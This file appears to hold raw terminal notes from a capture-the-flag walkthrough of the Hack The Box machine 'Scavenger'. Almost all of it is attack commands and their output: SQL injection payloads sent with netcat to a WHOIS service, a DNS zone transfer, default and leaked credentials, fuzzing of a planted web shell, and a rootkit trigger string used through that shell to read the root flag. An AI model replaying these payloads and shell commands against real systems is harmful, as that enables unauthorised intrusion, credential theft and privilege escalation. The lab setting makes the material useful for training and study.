@@ -1,0 +1,224 @@
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+' OR 1=1--;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ';') limit 1' at line 1
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select 1-- ; 
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1222 (21000): The used SELECT statements have a different number of columns
+
+No. of Columns
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') order by 1-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') order by 2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') order by 3-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1054 (42S22): Unknown column '3' in 'order clause'
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select 1,2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+1
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select group_concat(table_name),2 from information_schema.tables-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_CACHES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,GEOMETRY_COLUMNS,SPATIAL_REF_SYS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,TABLE_STATISTICS,INNODB_SYS_TABLESTATS,USER_STATISTICS,INNODB_SYS_INDEXES,XTRADB_RSEG,INNODB_CMP_PER_INDEX,INNODB_TRX,CHANGED_PAGE_BITMAPS,INNODB_FT_BEING_DELETED,INNODB_LOCK_WAITS,INNODB_LOCKS,INNODB_TABLESPACES_ENCRYPTION,XTRADB_INTERNAL_HASH_TABLES,INNODB_SYS_FIELDS,INNODB_CMPMEM_RESET,INNODB_CMP,INNODB_FT_INDEX_TABLE,INNODB_SYS_TABLESPACES,INNODB_MUTEXES,INNODB_BUFFER_PAGE_LRU,INNODB_SYS_FOREIGN_COLS,INNODB_CMP_RESET,INNODB_BUFFER_POOL_STATS,INNODB_FT_INDE
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select database(),2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+whois
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select group_concat(table_name),2 from information_schema.columns where table_schema=database()-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+customers,customers,customers
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+id,domain,data
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select @@version,2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+10.1.37-MariaDB-0+deb9u1
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select user(),2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+whois@localhost
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select @@hostname,2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+ib01
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select @@datadir,2-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+/var/lib/mysql/
+
+
+root@kali:~/HTB/Scavenger# nc 10.10.10.155 43
+a') union select group_concat(id,0x3a,domain),2 from customers-- ;
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+1:supersechosting.htb,2:justanotherblog.htb,3:pwnhats.htb,4:rentahacker.htb
+
+
+
+root@kali:~/HTB/Scavenger# dig axfr rentahacker.htb @10.10.10.155
+
+; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr rentahacker.htb @10.10.10.155
+;; global options: +cmd
+rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+rentahacker.htb.	604800	IN	NS	ns1.supersechosting.htb.
+rentahacker.htb.	604800	IN	MX	10 mail1.rentahacker.htb.
+rentahacker.htb.	604800	IN	A	10.10.10.155
+mail1.rentahacker.htb.	604800	IN	A	10.10.10.155
+sec03.rentahacker.htb.	604800	IN	A	10.10.10.155
+www.rentahacker.htb.	604800	IN	A	10.10.10.155
+rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+;; Query time: 1213 msec
+;; SERVER: 10.10.10.155#53(10.10.10.155)
+;; WHEN: Sun Aug 25 12:29:47 WAT 2019
+;; XFR size: 8 records (messages 1, bytes 251)
+
+Running Mantis Bug Tracker
+http://sec03.rentahacker.htb/my_view_page.php
+with default creds
+administrator:root
+
+
+
+root@kali:~/HTB/Scavenger# wfuzz -c --hl=0 -w /usr/share/wordlists/wfuzz/general/common.txt http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
+Total requests: 949
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                           
+===================================================================
+
+000000394:   200        1 L      1 W      8 Ch        "hidden"                                                          
+
+
+creds
+http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/ib01c03
+
+From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018 Return-path: Envelope-to: ib01c03@ib01.supersechosting.htb Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100 Received: from support by ib01.supersechosting.htb with local (Exim 4.89) (envelope-from ) id 1gWRtI-0000ZK-8Q for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100 To: Subject: Re: Please help! Site Defaced! In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100 References: X-Mailer: mail (GNU Mailutils 3.1.1) Message-Id: From: support Date: Mon, 10 Dec 2018 21:10:56 +0100 X-IMAPbase: 1544472964 2 Status: O X-UID: 1 >> Please we need your help. Our site has been defaced! >> What we should do now? >> >> rentahacker.htb Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs. Please check if there is any strange file in your web root and upload it to the ftp server: ftp.supersechosting.htb user: ib01ftp pass: YhgRt56_Ta Thanks. 
+
+
+strings ib01c01_incident.pcap | grep passwd
+pwnhats@pwnhats.htb:GetYouAH4t!
+
+
+root@kali:~/HTB/Scavenger# ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:root): ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -a
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx------    5 1001     1004         4096 Aug 26 09:28 .
+drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
+-rw-------    1 0        0               0 Dec 11  2018 .bash_history
+drwx------    2 1001     1004         4096 Aug 26 09:28 .ssh
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
+drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
+ftp> cd ...
+250 Directory successfully changed.
+ftp> ls -a
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 .
+drwx------    4 1001     1004         4096 Feb 01  2019 ..
+-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
+226 Directory send OK.
+
+
+
+
+https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485
+
+
+            0x080000b5      4889442418     mov qword [rsp + 0x18], rax
+            0x080000ba      31c0           xor eax, eax
+            0x080000bc      48b867307452.  movabs rax, 0x746f3052743067 ; 'g0tR0ot'
+            0x080000c6      c74424076733.  mov dword [rsp + 7], 0x743367 ; 'g3t' ; [0x743367:4]=-1
+            0x080000ce      c744240b5072.  mov dword [rsp + 0xb], 0x76317250 ; 'Pr1v' ; [0x76317250:4]=-1
+            0x080000d6      4889442410     mov qword [rsp + 0x10], rax
+            0x080000db      c644240f00     mov byte [rsp + 0xf], 0
+
+
+> GET /shell.php?hidden=echo%20%22g3tPr1v%22%20%3E%20/dev/ttyR0%20;%20cat%20/root/root.txt HTTP/1.1
+> Host: sec03.rentahacker.htb
+> User-Agent: curl/7.64.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Wed, 18 Sep 2019 16:52:59 GMT
+< Server: Apache/2.4.25 (Debian)
+< Content-Length: 33
+< Content-Type: text/html; charset=UTF-8
+< 
+4a08d8174e9ec22b01d91ddb9a732b17
+* Connection #0 to host sec03.rentahacker.htb left intact
+
